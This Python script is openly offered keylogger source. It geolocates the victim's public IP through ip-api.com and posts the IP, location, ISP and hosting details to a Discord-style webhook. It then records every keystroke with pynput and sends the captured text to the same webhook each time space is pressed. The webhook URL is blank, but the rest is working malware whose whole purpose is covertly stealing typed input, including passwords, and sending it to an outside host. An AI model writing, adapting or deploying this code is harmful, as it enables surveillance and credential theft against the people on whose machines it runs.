import queue
import threading
import requests
from pynput import keyboard
import time

# Initialize queue for storing keystrokes
keystroke_queue = queue.Queue()
response = requests.get('http://icanhazip.com')
ip = response.text.strip()
info = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()

embed = {
    "title": "Quick IP Info",
    "color": 0x00FF00,
    "fields": [
        {
            "name": "IP Address",
            "value": ip if ip else "Unknown",
            "inline": True
        },
        {
            "name": "Location",
            "value": f"{info['city']}, {info['regionName']}, {info['country']}",
            "inline": True
        },
        {
            "name": "ISP",
            "value": info['isp'] if info['isp'] else "Unknown",
            "inline": True
        },
        {
            "name": "AS Number",
            "value": info['as'] if info['as'] else "Unknown",
            "inline": True
        },
        {
            "name": "ASN Name",
            "value": info['asname'] if info['asname'] else "Unknown",
            "inline": True
        },
        {
            "name": "ORG",
            "value": info['org'] if info['org'] else "Unknown",
            "inline": True
        },
        {
            "name": "Reverse DNS",
            "value": info['reverse'] if info['reverse'] else "Unknown",
            "inline": True
        },
        {
            "name": "Mobile",
            "value": str(info['mobile']) if 'mobile' in info else "Unknown",
            "inline": True
        },
        {
            "name": "Proxy",
            "value": str(info['proxy']) if 'proxy' in info else "Unknown",
            "inline": True
        },
        {
            "name": "Hosting",
            "value": str(info['hosting']) if 'hosting' in info else "Unknown",
            "inline": True
        }
    ]
}

payload = {
    "username": "Keylogger",
    "content": "Quick IP Info",
    "embeds": [embed]
}

webhook = ""
headers = {"User-Agent": "Mozilla/5.0"}
response = requests.post(webhook, headers=headers, json=payload)
# Define function to send requests in a separate thread
def send_requests():
    keystrokes = []
    while True:
        try:
            # Get a keystroke from the queue
            keystroke = keystroke_queue.get()
            if hasattr(keystroke, 'char'):
                keystrokes.append(keystroke.char)
            elif hasattr(keystroke, 'name'):
                keystrokes.append('<{}>'.format(keystroke.name))
                # If the keystroke is a space, send the data to the webhook
                if keystroke.name == 'space':
                    headers = {"User-Agent": "Mozilla/5.0"}
                    payload= {
                                "username": "Keylogger",
                                "content": ''.join(keystrokes)
                            }
                    response = requests.post(webhook,headers=headers,json=payload)
                    if response.status_code == 200 or response.status_code == 204:
                        keystrokes = []
                    elif response.status_code == 429:
                        time.sleep(response.json()["retry_after"]/1000)
                        response = requests.post(webhook,headers=headers,json=payload)
                    else:
                        break
            else:
                continue
        except Exception as e:
            print('Error sending request:', e)

# Start the thread for sending requests
threading.Thread(target=send_requests, daemon=True).start()

# Define function to handle keystrokeshelo 
def on_press(key):
    try:
        # Add the keystroke to the queue
        keystroke_queue.put(key)
    except Exception as e:
        print('Error handling keystroke:', e)

# Start the keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
